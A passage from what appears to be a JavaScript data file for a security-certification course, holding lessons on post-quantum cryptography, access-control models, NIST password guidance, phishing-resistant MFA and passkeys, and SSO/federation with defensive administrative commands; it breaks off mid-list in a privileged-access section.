<div class="callout exam"><b>Exam mapping:</b> Security+ SY0-701 objective 1.4 — certificates (CAs, CRLs, OCSP, self-signed, third-party, root of trust, CSR generation, wildcard), and 4.5 secure protocols. Know that a CRL is a downloaded list while OCSP is a real-time query, and that the root CA should be kept offline.</div>`,
  keyTerms: [
    ["PKI", "Public Key Infrastructure: CAs, certificates, policies and processes binding keys to identities"],
    ["Certificate Authority", "Trusted entity that signs and issues certificates"],
    ["X.509", "Standard certificate format (RFC 5280)"],
    ["CSR", "Certificate Signing Request containing a public key and identity"],
    ["SAN", "Subject Alternative Name: list of names a certificate is valid for"],
    ["CRL", "Certificate Revocation List published by a CA"],
    ["OCSP", "Online Certificate Status Protocol for real-time revocation checks"],
    ["Chain of trust", "Verification path from a leaf certificate up to a trusted root"],
    ["ACME", "Protocol for automated certificate issuance and renewal (RFC 8555)"],
    ["TLS 1.3", "Current TLS version (RFC 8446) with mandatory forward secrecy and 1-RTT handshake"]
  ],
  standards: ["RFC 5280", "RFC 8446", "RFC 8555", "RFC 6960", "RFC 6962", "RFC 8996", "CA/B Forum Ballot SC-081"],
  labs: ["lab-crypto-hash"]
},
{
  id: "p1-m3-l4",
  module: "p1-m3",
  title: "Post-Quantum Cryptography and Crypto Agility",
  minutes: 18,
  objectives: [
    "Explain why quantum computers threaten RSA and ECC but not (seriously) AES",
    "Name the NIST post-quantum standards FIPS 203, 204 and 205 and their purposes",
    "Describe 'harvest now, decrypt later' and the migration timeline",
    "Explain crypto agility and the first steps of a PQC migration"
  ],
  html: `<p>Most of the public-key cryptography protecting the internet today — RSA, Diffie-Hellman, ECDH and ECDSA — would be broken by a sufficiently large, error-corrected quantum computer. Nobody has built one yet, and estimates of when one might exist vary widely, but the migration to quantum-resistant algorithms is already underway and will dominate cryptography work for the next decade. Security professionals hired today will run it.</p>

<h3>What quantum computers break</h3>
<table>
<tr><th>Algorithm type</th><th>Quantum attack</th><th>Impact</th><th>Response</th></tr>
<tr><td>RSA, DH, ECC (ECDH, ECDSA, EdDSA)</td><td><b>Shor's algorithm</b> solves factoring and discrete logarithms efficiently</td><td><b>Broken</b> regardless of key size</td><td>Replace with PQC algorithms</td></tr>
<tr><td>Symmetric ciphers (AES)</td><td><b>Grover's algorithm</b> gives a quadratic speed-up in brute force</td><td>Effective strength roughly halved in theory</td><td>Use AES-256 for long-term protection; AES-128 is still widely considered acceptable</td></tr>
<tr><td>Hashes (SHA-2, SHA-3)</td><td>Grover-style speed-ups</td><td>Modest</td><td>SHA-256/384 remain fine</td></tr>
</table>

<h3>Harvest now, decrypt later</h3>
<p>An adversary can record encrypted traffic today and store it until a quantum computer is available. Any data that must stay confidential for 10+ years — health records, state secrets, intellectual property, long-lived personal data — is therefore <i>already</i> at risk. This is why key exchange (which protects confidentiality) is being migrated first, before signatures (which only need to resist forgery at the time of verification).</p>

<h3>The NIST standards (August 2024)</h3>
<p>After an eight-year public competition, NIST published the first three post-quantum Federal Information Processing Standards on 13 August 2024:</p>
<table>
<tr><th>Standard</th><th>Algorithm</th><th>Based on</th><th>Purpose</th></tr>
<tr><td><b>FIPS 203</b></td><td><b>ML-KEM</b> (from CRYSTALS-Kyber)</td><td>Module lattices</td><td><b>Key encapsulation</b> — replaces RSA/ECDH key exchange. Parameter sets ML-KEM-512, -768, -1024</td></tr>
<tr><td><b>FIPS 204</b></td><td><b>ML-DSA</b> (from CRYSTALS-Dilithium)</td><td>Module lattices</td><td><b>Digital signatures</b> — the primary general-purpose replacement for RSA/ECDSA signatures</td></tr>
<tr><td><b>FIPS 205</b></td><td><b>SLH-DSA</b> (from SPHINCS+)</td><td>Hash functions only</td><td><b>Digital signatures</b> — conservative backup with large signatures, relying only on hash security</td></tr>
</table>
<p>More are coming: <b>FN-DSA</b> (from Falcon, compact signatures) is being finalized as FIPS 206, and in March 2025 NIST selected <b>HQC</b>, a code-based KEM, as a backup to ML-KEM in case lattices turn out to have a weakness. Stateful hash-based signatures (LMS and XMSS, NIST SP 800-208) are already approved for niche uses such as firmware signing.</p>
<div class="callout tip">A <b>KEM</b> (key-encapsulation mechanism) works differently from Diffie-Hellman: one side uses the other's public key to "encapsulate" a fresh random secret, and only the private-key holder can "decapsulate" it. The result is the same — both sides share a symmetric key — which then drives AES-GCM as usual.</div>

<h3>The migration timeline</h3>
<ul>
<li><b>NIST IR 8547</b> (initial public draft, November 2024) proposes deprecating quantum-vulnerable algorithms at the 112-bit security level (such as RSA-2048) after <b>2030</b> and disallowing quantum-vulnerable public-key algorithms entirely by <b>2035</b>.</li>
<li><b>NSA CNSA 2.0</b> sets earlier dates for U.S. national security systems, preferring PQC for software/firmware signing and networking equipment now and targeting full transition around 2033–2035.</li>
<li>U.S. National Security Memorandum 10 (2022) and the Quantum Computing Cybersecurity Preparedness Act require federal agencies to inventory their cryptography; the EU has published a coordinated PQC roadmap targeting high-risk systems by 2030.</li>
</ul>

<h3>Already deployed: hybrid key exchange</h3>
<p>You are probably using PQC right now. Chrome, Edge, Firefox and Safari (iOS/macOS 26) negotiate the hybrid TLS key share <b>X25519MLKEM768</b>, which combines classical X25519 with ML-KEM-768 — secure as long as <i>either</i> component holds. Cloudflare reports a large and growing share of its TLS traffic is now post-quantum protected. <b>OpenSSH 10.0</b> (April 2025) made the hybrid <code>mlkem768x25519-sha256</code> its default key exchange, and Signal (PQXDH) and Apple iMessage (PQ3) added PQ protection to messaging.</p>
<pre><code># Which key exchange did SSH negotiate?
$ ssh -v user@server 2&gt;&amp;1 | grep "kex: algorithm"
debug1: kex: algorithm: mlkem768x25519-sha256
# OpenSSL 3.5+ supports ML-KEM, ML-DSA and SLH-DSA natively
$ openssl list -kem-algorithms | grep -i mlkem</code></pre>

<h3>Crypto agility and how a migration starts</h3>
<p><b>Crypto agility</b> is the ability to swap algorithms without redesigning systems — configuration, not code rewrites. The PQC experience shows why it matters: organizations that hard-coded RSA in hundreds of applications face years of work. The first steps every organization is taking:</p>
<ol>
<li><b>Inventory</b> — find where cryptography is used: TLS endpoints, VPNs, SSH, code signing, PKI, databases, HSMs, vendor products, embedded/IoT. A <b>cryptographic bill of materials (CBOM)</b> records it.</li>
<li><b>Prioritize</b> — long-lived confidential data and long-lived devices first.</li>
<li><b>Ask vendors</b> for PQC roadmaps and include PQC requirements in procurement.</li>
<li><b>Enable hybrid</b> key exchange where supported (TLS, SSH, VPN) and test for breakage — PQC keys and signatures are much larger (an ML-KEM-768 public key is 1,184 bytes vs 32 for X25519), which can upset middleboxes and constrained devices.</li>
<li><b>Plan PKI</b> — PQC certificate hierarchies and signatures follow once standards and browser support mature.</li>
</ol>
<div class="callout real"><b>On the job:</b> junior analysts often contribute to the inventory phase — scanning TLS configurations across the estate, listing certificate key types and expiry dates, and flagging legacy protocols. It is the same tooling you use for certificate hygiene, with a new purpose.</div>
<div class="callout exam"><b>Exam mapping:</b> Security+ SY0-701 objective 1.4 covers algorithm selection and key length, and Domain 1 references emerging technologies; SY0-701 predates the final FIPS, so expect only conceptual questions. CISSP Domain 3 covers the cryptographic lifecycle and algorithm selection, where quantum resistance is now a standard consideration.</div>`,
  keyTerms: [
    ["Post-quantum cryptography", "Classical algorithms designed to resist attacks by quantum computers"],
    ["Shor's algorithm", "Quantum algorithm that breaks RSA, DH and ECC"],
    ["Grover's algorithm", "Quantum search giving a quadratic speed-up against symmetric keys"],
    ["ML-KEM (FIPS 203)", "Lattice-based key-encapsulation mechanism, formerly CRYSTALS-Kyber"],
    ["ML-DSA (FIPS 204)", "Lattice-based digital signature algorithm, formerly CRYSTALS-Dilithium"],
    ["SLH-DSA (FIPS 205)", "Stateless hash-based signature algorithm, formerly SPHINCS+"],
    ["Harvest now, decrypt later", "Recording encrypted data today to decrypt with future quantum computers"],
    ["Hybrid key exchange", "Combining classical and PQC algorithms, e.g. X25519MLKEM768"],
    ["Crypto agility", "Ability to replace cryptographic algorithms with minimal disruption"],
    ["CBOM", "Cryptographic Bill of Materials inventorying cryptographic assets"]
  ],
  standards: ["FIPS 203", "FIPS 204", "FIPS 205", "NIST IR 8547 (draft)", "NIST SP 800-208", "NSA CNSA 2.0"]
}
);

// ===================== p1-m4 Identity & Access Management =====================
CP.lessons.push(
{
  id: "p1-m4-l1",
  module: "p1-m4",
  title: "Access Control Fundamentals and Models",
  minutes: 18,
  objectives: [
    "Distinguish identification, authentication, authorization and accounting",
    "Name the authentication factor types and what makes MFA genuinely multi-factor",
    "Compare DAC, MAC, RBAC, rule-based and ABAC access control models",
    "Apply least privilege, separation of duties and need-to-know"
  ],
  html: `<p>Identity is the new perimeter. With users working from anywhere and applications living in SaaS and cloud platforms, the question "who is this, and should they be allowed to do this right now?" has become the center of security. Most modern breaches involve a compromised identity somewhere in the chain.</p>

<h3>The access-control sequence</h3>
<ol>
<li><b>Identification</b> — a subject claims an identity (username, email, certificate subject).</li>
<li><b>Authentication</b> — the subject proves it.</li>
<li><b>Authorization</b> — policy decides what the subject may access.</li>
<li><b>Accounting / auditing</b> — actions are logged and attributable.</li>
</ol>
<p>Subjects are not only humans: service accounts, workloads, API clients, devices and increasingly <b>AI agents</b> are <b>non-human identities</b>, and in many organizations they outnumber employees many times over. They need the same lifecycle and least-privilege discipline.</p>

<h3>Authentication factors</h3>
<table>
<tr><th>Factor</th><th>Examples</th><th>Weaknesses</th></tr>
<tr><td><b>Something you know</b></td><td>Password, PIN, passphrase</td><td>Phishing, reuse, guessing</td></tr>
<tr><td><b>Something you have</b></td><td>Security key, phone with authenticator app, smart card, passkey on a device</td><td>Loss, theft, SIM swap (SMS)</td></tr>
<tr><td><b>Something you are</b></td><td>Fingerprint, face, iris, voice</td><td>Cannot be changed if compromised; false accept/reject rates</td></tr>
<tr><td><b>Somewhere you are</b></td><td>GPS, IP geolocation, network location</td><td>Spoofable; used as a signal rather than a true factor</td></tr>
</table>
<p><b>Multi-factor authentication (MFA)</b> requires factors from <i>different</i> categories. A password plus a security question is two things you know — that is <b>not</b> MFA. Biometric performance is measured by the <b>FAR</b> (false acceptance rate, a security failure), the <b>FRR</b> (false rejection rate, a usability failure) and the <b>CER/EER</b> (crossover error rate where they are equal — lower is better).</p>

<h3>Access control models</h3>
<table>
<tr><th>Model</th><th>Who decides</th><th>How it works</th><th>Where you see it</th></tr>
<tr><td><b>DAC</b> — Discretionary</td><td>The resource owner</td><td>Owners grant access at their discretion via ACLs</td><td>NTFS and Linux file permissions, sharing a Google Doc</td></tr>
<tr><td><b>MAC</b> — Mandatory</td><td>The system, per central policy</td><td>Labels (classification) on subjects and objects: Top Secret, Secret, Confidential; users cannot override</td><td>Military/government systems; SELinux, AppArmor</td></tr>
<tr><td><b>RBAC</b> — Role-based</td><td>Administrators define roles</td><td>Permissions attach to roles; users get roles</td><td>AD groups, cloud IAM roles, most business apps</td></tr>
<tr><td><b>Rule-based</b></td><td>Administrators define rules</td><td>Global rules apply to everyone</td><td>Firewall ACLs, "no logins outside 07:00–19:00"</td></tr>
<tr><td><b>ABAC</b> — Attribute-based</td><td>Policy engine</td><td>Decisions on attributes of user, resource, action and environment</td><td>Cloud policies with conditions, Conditional Access, zero trust</td></tr>
</table>
<p>An ABAC rule might read: <i>allow</i> if <code>user.department == "Finance"</code> AND <code>resource.classification &lt;= "Confidential"</code> AND <code>device.compliant == true</code> AND <code>time</code> is within business hours. ABAC is more expressive than RBAC and is the model behind zero trust policy engines (NIST SP 800-162 describes it).</p>
<div class="callout exam"><b>Exam tip:</b> "The data owner decides" → DAC. "Labels and clearances" → MAC. "Job function" → RBAC. "Conditions like location, time and device health" → ABAC. "Applies to all users equally, like a firewall" → rule-based. Security+ SY0-701 objective 4.6 lists these models, plus time-of-day restrictions and least privilege.</div>

<h3>Principles that guide authorization</h3>
<ul>
<li><b>Least privilege</b> — grant the minimum access required, for the minimum time.</li>
<li><b>Need to know</b> — even with clearance, access only data required for the current task.</li>
<li><b>Separation of duties</b> — split critical tasks so no single person can complete them alone (one person creates a vendor, another approves payments).</li>
<li><b>Job rotation and mandatory vacations</b> — expose fraud that relies on one person's continuous presence.</li>
<li><b>Implicit deny</b> — anything not explicitly allowed is denied.</li>
</ul>
<div class="callout real"><b>On the job:</b> <b>privilege creep</b> is endemic: people change roles and keep old access. Periodic <b>access reviews</b> (recertification), where managers confirm each user's access, are a core control in SOX, PCI DSS and ISO 27001 audits — and the evidence analysts often help gather. Orphaned accounts of departed employees are a frequent finding and a real attack path.</div>

<h3>Account types</h3>
<ul>
<li><b>User accounts</b> — one per person, never shared.</li>
<li><b>Privileged/admin accounts</b> — separate from the daily account (e.g. <code>jdoe</code> and <code>jdoe-adm</code>), used only from secure workstations.</li>
<li><b>Service accounts</b> — for applications; no interactive logon; managed credentials (gMSA, workload identities).</li>
<li><b>Shared/generic accounts</b> — avoid; they break accountability and non-repudiation.</li>
<li><b>Guest accounts</b> — disabled unless needed, time-limited.</li>
</ul>
<pre><code># Linux: who can use sudo, and when did accounts last log in?
$ getent group sudo wheel
$ lastlog | grep -v "Never logged in"
# Windows/AD: members of privileged groups and accounts with non-expiring passwords
PS&gt; Get-ADGroupMember "Domain Admins" -Recursive
PS&gt; Search-ADAccount -PasswordNeverExpires -UsersOnly | Select-Object Name</code></pre>`,
  keyTerms: [
    ["Identification", "Claiming an identity, e.g. entering a username"],
    ["MFA", "Authentication using factors from two or more different categories"],
    ["FAR / FRR", "Biometric false acceptance rate / false rejection rate"],
    ["DAC", "Discretionary Access Control: owners grant access"],
    ["MAC", "Mandatory Access Control: system-enforced labels and clearances"],
    ["RBAC", "Role-Based Access Control: permissions assigned to roles"],
    ["ABAC", "Attribute-Based Access Control: policy on user, resource and context attributes"],
    ["Separation of duties", "Dividing critical tasks so no one person can complete them alone"],
    ["Privilege creep", "Accumulation of unneeded access over time"],
    ["Non-human identity", "Service accounts, workloads, API keys and agents that authenticate"]
  ],
  standards: ["NIST SP 800-162", "NIST SP 800-53 Rev. 5 (AC family)"]
},
{
  id: "p1-m4-l2",
  module: "p1-m4",
  title: "Passwords Done Right: NIST SP 800-63B and Modern Password Policy",
  minutes: 18,
  objectives: [
    "Summarize the current NIST SP 800-63B password requirements",
    "Explain why complexity rules and forced periodic rotation are discouraged",
    "Describe blocklists, rate limiting and password managers",
    "Explain authenticator assurance levels (AAL1–AAL3)"
  ],
  html: `<p>For decades, password policy meant "8 characters, an uppercase, a number, a symbol, and change it every 90 days". Research showed this produces predictable passwords (<code>Summer2026!</code> → <code>Autumn2026!</code>), sticky notes and reuse. NIST's Digital Identity Guidelines changed the advice in 2017 and strengthened it again in <b>SP 800-63-4</b>, finalized in 2025. Many audits and frameworks now reference it, and you will be asked to explain it.</p>

<h3>The core rules for passwords (SP 800-63B, Revision 4)</h3>
<table>
<tr><th>Topic</th><th>Requirement</th></tr>
<tr><td>Minimum length</td><td><b>15 characters</b> when the password is the only factor; at least <b>8</b> when used as part of MFA</td></tr>
<tr><td>Maximum length</td><td>Allow at least <b>64</b> characters (passphrases)</td></tr>
<tr><td>Characters</td><td>Accept all printable ASCII, the space character and Unicode</td></tr>
<tr><td>Composition rules</td><td><b>Shall not</b> require mixtures of character types</td></tr>
<tr><td>Periodic changes</td><td><b>Shall not</b> require arbitrary rotation; <b>shall</b> force a change on evidence of compromise</td></tr>
<tr><td>Blocklist</td><td><b>Shall</b> check new passwords against a list of commonly used, expected or compromised values (breach corpuses, dictionary words, context words like the service name)</td></tr>
<tr><td>Hints and knowledge-based questions</td><td>Not allowed ("What was your first pet's name?" is out)</td></tr>
<tr><td>Password managers</td><td>Allow paste and autofill</td></tr>
<tr><td>Throttling</td><td>Limit failed attempts (rate limiting) to defeat online guessing</td></tr>
<tr><td>Storage</td><td>Salted and hashed with an approved, slow key-derivation function (see p1-m3)</td></tr>
</table>
<div class="callout tip"><b>Why length beats complexity:</b> the search space grows exponentially with length. A random 8-character password using all 95 printable characters has about 95<sup>8</sup> ≈ 6.6 × 10<sup>15</sup> possibilities. A four-word random passphrase from a 7,776-word Diceware list has 7,776<sup>4</sup> ≈ 3.7 × 10<sup>15</sup> — similar — and five words gives 2.8 × 10<sup>19</sup>, thousands of times more, while being far easier to remember. Human-chosen "complex" passwords are much weaker than either because they follow patterns crackers model.</div>

<h3>Why forced rotation hurts</h3>
<p>When forced to change passwords regularly, users make small predictable transformations. Attackers who crack an old password can usually guess the new one. Rotation also trains users to accept password-change prompts — useful to phishers. The modern approach: long passwords, a blocklist, MFA, and <b>change on compromise</b> (e.g. the password appears in a breach dataset, or credential-theft malware was found on the user's device).</p>

<h3>Implementing a blocklist</h3>
<p>Microsoft Entra Password Protection blocks common and organization-specific terms (company name, products, city) for cloud and on-prem AD. For custom applications, the k-anonymity API of <b>Have I Been Pwned's Pwned Passwords</b> lets you check a password without sending it: you send only the first five hex characters of its SHA-1 hash and compare suffixes locally.</p>
<pre><code>$ echo -n 'Autumn2026!' | sha1sum | tr a-f A-F
# send only the first 5 characters to the range API, compare the rest locally
$ curl -s https://api.pwnedpasswords.com/range/&lt;FIRST5&gt; | grep &lt;REMAINING35&gt;</code></pre>

<h3>Authenticator Assurance Levels</h3>
<table>
<tr><th>Level</th><th>Requires</th><th>Example</th></tr>
<tr><td><b>AAL1</b></td><td>Single-factor or multi-factor</td><td>Password only (15+ characters)</td></tr>
<tr><td><b>AAL2</b></td><td>Two distinct factors; verifiers must <i>offer</i> a phishing-resistant option</td><td>Password + authenticator app; synced passkey</td></tr>
<tr><td><b>AAL3</b></td><td>Phishing-resistant, hardware-backed, non-exportable key</td><td>FIDO2 security key, smart card (PIV/CAC), device-bound passkey</td></tr>
</table>
<p>SP 800-63B treats SMS and voice one-time codes as a <b>restricted</b> authenticator because of SIM-swap and interception risk: organizations using them must assess the risk and offer alternatives. Revision 4 also formally recognizes <b>syncable authenticators</b> (synced passkeys) at AAL2.</p>
<div class="callout warn"><b>Account lockout trade-off:</b> aggressive lockout (3 attempts, locked until helpdesk unlocks) stops brute force but lets anyone lock out your whole company — a denial-of-service. Throttling with increasing delays, smart lockout that distinguishes familiar from unfamiliar locations, and MFA usually work better. Microsoft's current Windows baseline uses a 10-attempt threshold with a 10-minute lockout.</div>

<h3>Translating this into a policy</h3>
<pre><code>Password Standard (excerpt)
- Minimum 15 characters for password-only accounts; 12+ recommended with MFA
- No composition requirements; all characters including spaces permitted; max 64+
- Checked at creation against breached and banned-word lists
- No scheduled expiry; immediate reset on suspected compromise
- MFA required for all remote, cloud and privileged access; phishing-resistant
  MFA (FIDO2/passkeys) required for administrators
- Company-approved password manager provided to all staff
- Service accounts: 30+ random characters or managed identities (gMSA), vaulted</code></pre>
<div class="callout real"><b>On the job:</b> auditors and older frameworks may still demand 90-day rotation. Present the NIST guidance and compensating controls (MFA, breach monitoring) and document the decision. PCI DSS v4.0.1, for example, allows dropping the 90-day change requirement for accounts protected by MFA or when the account's security posture is analyzed dynamically.</div>
<div class="callout exam"><b>Exam mapping:</b> Security+ SY0-701 objective 4.6 "Given a scenario, implement and maintain identity and access management" — password concepts (length, complexity, reuse, expiration, age), password managers, passwordless. Note: CompTIA questions may still describe complexity and expiration as policy settings; know both the settings and the NIST reasoning.</div>`,
  keyTerms: [
    ["NIST SP 800-63B", "NIST guideline for authentication and authenticator lifecycle"],
    ["Passphrase", "Long password made of several words"],
    ["Password blocklist", "List of common, expected or breached passwords that must be rejected"],
    ["Composition rules", "Required character-type mixes; discouraged by NIST"],
    ["Throttling", "Limiting the rate of failed authentication attempts"],
    ["AAL", "Authenticator Assurance Level (1–3) defined in SP 800-63B"],
    ["Restricted authenticator", "Authenticator like SMS OTP permitted only with risk assessment and alternatives"],
    ["Password manager", "Tool that generates and stores unique strong passwords"],
    ["k-anonymity", "Privacy technique: query with a hash prefix so the full value is never sent"]
  ],
  standards: ["NIST SP 800-63-4", "NIST SP 800-63B", "PCI DSS v4.0.1"],
  labs: ["lab-password-policy"]
},
{
  id: "p1-m4-l3",
  module: "p1-m4",
  title: "MFA, Passkeys and FIDO2: Phishing-Resistant Authentication",
  minutes: 20,
  objectives: [
    "Rank MFA methods by phishing resistance",
    "Explain how FIDO2 (WebAuthn + CTAP) works and why origin binding stops phishing",
    "Compare synced and device-bound passkeys",
    "Describe deployment considerations: recovery, enrollment and conditional access"
  ],
  html: `<p>MFA blocks the vast majority of automated account attacks — but not all MFA is equal. Real-time phishing kits now routinely defeat SMS codes, authenticator-app codes and push approvals. The answer the industry, CISA and NIST have converged on is <b>phishing-resistant MFA</b>, and the form most people will actually use is the <b>passkey</b>.</p>

<h3>MFA methods compared</h3>
<table>
<tr><th>Method</th><th>How it works</th><th>Phishing-resistant?</th><th>Main weaknesses</th></tr>
<tr><td>SMS / voice OTP</td><td>Code sent to phone number</td><td>No</td><td>SIM swap, interception, real-time phishing</td></tr>
<tr><td>Email OTP / magic link</td><td>Code or link to inbox</td><td>No</td><td>Only as strong as the mailbox</td></tr>
<tr><td>TOTP app (RFC 6238)</td><td>Time-based 6-digit code from shared secret</td><td>No</td><td>User types code into a fake site; AiTM relays it</td></tr>
<tr><td>Push notification</td><td>Approve prompt in app</td><td>No (better with number matching)</td><td>MFA fatigue; AiTM</td></tr>
<tr><td>Smart card / PIV (certificate-based)</td><td>Private key on card, PIN-protected</td><td><b>Yes</b></td><td>Infrastructure cost, card readers</td></tr>
<tr><td><b>FIDO2 security key / passkey</b></td><td>Origin-bound public-key challenge-response</td><td><b>Yes</b></td><td>Account recovery and enrollment must also be secured</td></tr>
<tr><td>Windows Hello for Business, platform authenticators</td><td>TPM-protected key unlocked by PIN/biometric</td><td><b>Yes</b></td><td>Device-bound</td></tr>
</table>

<h3>How FIDO2 works</h3>
<p>FIDO2 combines the W3C <b>WebAuthn</b> API (the browser/website side) with the FIDO Alliance's <b>CTAP</b> (Client to Authenticator Protocol, for talking to an external security key over USB, NFC or Bluetooth).</p>
<ol>
<li><b>Registration:</b> the authenticator generates a <i>new key pair just for this site</i>. The private key stays in the authenticator (secure element, TPM, Secure Enclave, or the platform's protected keychain); the public key and a credential ID are sent to the website. No shared secret ever exists on the server.</li>
<li><b>Authentication:</b> the site sends a random <b>challenge</b>. The browser passes it along with the site's <b>origin</b> (e.g. <code>https://login.example.com</code>). The user verifies locally (fingerprint, face or PIN — this never leaves the device), and the authenticator signs challenge + origin with the private key.</li>
<li>The server verifies the signature with the stored public key.</li>
</ol>
<p><b>Why phishing fails:</b> on <code>https://login.examp1e-secure.com</code> the browser reports <i>that</i> origin; the authenticator either has no key for it or produces a signature bound to the wrong origin, which the real site rejects. There is no code for the user to type into the wrong place, and a breached server database contains only public keys — useless to an attacker.</p>
<div class="callout tip">FIDO2 with user verification is itself multi-factor: <i>something you have</i> (the device holding the private key) plus <i>something you are or know</i> (biometric or PIN unlocking it).</div>

<h3>Passkeys: synced vs device-bound</h3>
<table>
<tr><th></th><th>Synced passkey</th><th>Device-bound passkey</th></tr>
<tr><td>Where the key lives</td><td>Encrypted and synced via a credential manager (Apple iCloud Keychain, Google Password Manager, Microsoft, 1Password, Bitwarden...)</td><td>One physical device: a YubiKey or similar security key, or a TPM</td></tr>
<tr><td>Loss of device</td><td>Recoverable on other devices</td><td>Need a backup key or recovery process</td></tr>
<tr><td>Assurance</td><td>AAL2 (NIST SP 800-63-4)</td><td>AAL3 possible (hardware, non-exportable)</td></tr>
<tr><td>Best for</td><td>Consumers, most workforce users</td><td>Administrators, high-risk users, regulated environments</td></tr>
</table>
<p>Adoption has accelerated sharply: Google, Apple, Microsoft, Amazon, GitHub, PayPal and many banks support passkeys; Microsoft made new consumer accounts passwordless by default in 2025, and the FIDO Alliance's Credential Exchange specifications allow passkeys to be moved securely between credential managers. <b>Cross-device</b> sign-in lets you use a phone's passkey to log in on a nearby computer by scanning a QR code, with Bluetooth proximity checks preventing remote relay.</p>

<h3>Deployment considerations</h3>
<ul>
<li><b>Recovery and enrollment are the new attack surface.</b> If an attacker can phone the help desk and get a temporary access pass or register their own passkey, phishing resistance is moot (see the Scattered Spider attacks in p1-m2). Require strong identity verification for MFA resets.</li>
<li><b>Eliminate fallbacks.</b> If SMS remains available as a backup, attackers will downgrade to it. Phase weak methods out, starting with privileged users.</li>
<li><b>Use Conditional Access / policy:</b> require phishing-resistant "authentication strength" for admin roles and sensitive apps, plus device compliance.</li>
<li><b>Protect sessions too.</b> Passkeys protect the login; the resulting session cookie can still be stolen by infostealer malware. Short session lifetimes, token binding efforts (e.g. Device Bound Session Credentials in Chrome) and continuous access evaluation help.</li>
<li><b>Legacy protocols</b> (IMAP, POP, basic auth) bypass MFA entirely — disable them.</li>
</ul>
<div class="callout real"><b>On the job:</b> in Microsoft Entra ID sign-in logs, check the <i>Authentication details</i> to see which method was used. A successful sign-in where MFA was satisfied "by claim in the token" from an unfamiliar IP shortly after a user clicked a phishing link is a classic AiTM token-replay pattern: revoke sessions, reset credentials, and look for new inbox rules or MFA methods registered by the attacker.</div>
<div class="callout exam"><b>Exam mapping:</b> Security+ SY0-701 objective 4.6 — MFA implementations (biometrics, hard/soft authentication tokens, security keys), factors, and passwordless. CISA and OMB M-22-09 require phishing-resistant MFA for U.S. federal agencies; CISSP Domain 5 covers the same concepts at a governance level.</div>`,
  keyTerms: [
    ["Phishing-resistant MFA", "Authentication that cannot be relayed through a fake site, e.g. FIDO2 or PIV"],
    ["FIDO2", "FIDO Alliance standard combining WebAuthn and CTAP"],
    ["WebAuthn", "W3C API letting websites register and use public-key credentials"],
    ["CTAP", "Client to Authenticator Protocol for external authenticators over USB/NFC/BLE"],
    ["Passkey", "FIDO2 discoverable credential that replaces a password"],
    ["Origin binding", "Signing the website origin into the response so credentials only work on the real site"],
    ["Synced passkey", "Passkey replicated across devices by a credential manager"],
    ["Device-bound passkey", "Passkey whose private key never leaves one hardware device"],
    ["TOTP", "Time-based one-time password (RFC 6238)"],
    ["Number matching", "Push MFA requiring the user to enter a number shown at sign-in"]
  ],
  standards: ["W3C WebAuthn Level 3", "FIDO CTAP 2.2", "RFC 6238", "NIST SP 800-63-4", "OMB M-22-09"],
  labs: ["lab-password-policy"]
},
{
  id: "p1-m4-l4",
  module: "p1-m4",
  title: "SSO, Federation, Identity Lifecycle and Privileged Access",
  minutes: 20,
  objectives: [
    "Explain SSO and federation with SAML 2.0, OAuth 2.0 and OpenID Connect",
    "Describe the joiner-mover-leaver lifecycle and automated provisioning (SCIM)",
    "Explain privileged access management: vaulting, JIT access and session recording",
    "Identify common identity attack paths in federated environments"
  ],
  html: `<p>Employees use dozens of applications. Without central identity, each has its own password and its own offboarding step that someone forgets. <b>Single sign-on (SSO)</b> and <b>federation</b> centralize authentication at an <b>identity provider (IdP)</b> such as Microsoft Entra ID, Okta, Google Workspace or Ping, so one strong login (with phishing-resistant MFA) unlocks many <b>service providers (SPs)</b> or relying parties.</p>

<h3>The three protocols</h3>
<table>
<tr><th></th><th>SAML 2.0</th><th>OAuth 2.0</th><th>OpenID Connect (OIDC)</th></tr>
<tr><td>Purpose</td><td>Authentication + attributes (federated SSO)</td><td><b>Authorization</b> — delegated access to APIs</td><td><b>Authentication</b> layer on top of OAuth 2.0</td></tr>
<tr><td>Token format</td><td>XML assertion, signed</td><td>Access token (often a JWT), refresh token</td><td>ID token (JWT) + OAuth tokens</td></tr>
<tr><td>Typical use</td><td>Enterprise web SSO to SaaS</td><td>"Allow this app to read your calendar"</td><td>"Sign in with Google/Microsoft", modern apps and mobile</td></tr>
<tr><td>Standard</td><td>OASIS SAML 2.0</td><td>RFC 6749 (OAuth 2.1 in progress)</td><td>OpenID Connect Core 1.0</td></tr>
</table>
<h4>A SAML SSO flow (SP-initiated)</h4>
<ol>
<li>User visits the SaaS app (SP); it redirects the browser to the IdP with an authentication request.</li>
<li>The IdP authenticates the user (password + passkey, Conditional Access checks).</li>
<li>The IdP returns a <b>signed assertion</b> ("this is jdoe@corp.com, groups: Finance") via the browser.</li>
<li>The SP verifies the signature with the IdP's certificate and creates a session.</li>
</ol>
<p>OAuth is often misunderstood: an OAuth <b>access token</b> says "the bearer may call these APIs with these <b>scopes</b>" — it does not by itself prove who the user is. OIDC adds the <b>ID token</b> for that. A JWT is three Base64URL parts — header, payload (claims such as <code>iss</code>, <code>sub</code>, <code>aud</code>, <code>exp</code>) and signature — so anyone can read its claims; only the signature prevents tampering.</p>
<div class="callout warn"><b>Identity attack paths to know:</b> <i>illicit consent grants</i> (a phishing link asks users to grant a malicious OAuth app access to their mailbox — no password stolen, MFA irrelevant); <i>token theft</i> (stealing refresh tokens or session cookies); <i>forged SAML assertions</i> ("Golden SAML") using a stolen IdP token-signing key, as seen in the SolarWinds campaign; and abuse of over-privileged app registrations and service principals. Review consented apps and restrict user consent.</div>

<h3>Identity lifecycle: joiner, mover, leaver</h3>
<ul>
<li><b>Joiner</b> — HR system creates the person; accounts and role-based access are provisioned automatically.</li>
<li><b>Mover</b> — role change removes old access and grants new (preventing privilege creep).</li>
<li><b>Leaver</b> — immediate disablement on termination: disable accounts, <b>revoke sessions and tokens</b>, rotate any shared secrets they knew, recover devices, transfer data ownership.</li>
</ul>
<p><b>SCIM</b> (System for Cross-domain Identity Management, RFC 7643/7644) lets the IdP provision and deprovision accounts in SaaS apps automatically. <b>Attestation</b> (access reviews) periodically confirms each entitlement is still needed. Identity governance (IGA) tools automate all of this.</p>
<pre><code># Microsoft Graph PowerShell: disable a leaver and revoke sessions
PS&gt; Update-MgUser -UserId jdoe@corp.com -AccountEnabled:$false
PS&gt; Revoke-MgUserSignInSession -UserId jdoe@corp.com
# On-prem AD
PS&gt; Disable-ADAccount -Identity jdoe</code></pre>

<h3>Privileged access management (PAM)</h3>
<p>Admin credentials are the attacker's goal, so they get extra protection:</p>
<ul>
